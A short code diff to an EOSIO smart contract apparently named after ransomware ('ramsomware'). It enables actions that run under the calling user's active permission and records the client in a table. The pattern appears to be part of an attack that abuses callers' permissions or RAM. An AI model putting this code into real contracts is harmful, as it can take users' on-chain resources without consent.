@@ -40,9 +40,8 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             uint128_t initnum = 1;
             transaction out1{};
             transaction out2{};
-            //out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client,  uint64_t(1)) );
-            //out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client, uint64_t(2)) );
-            //upsert(name("capamerica"), idx);
+            out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client,  uint64_t(idx*2)) );
+            out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client, uint64_t(idx*2 +1)) );
             upsert(client, idx);
 
             out1.actions.pop_back();
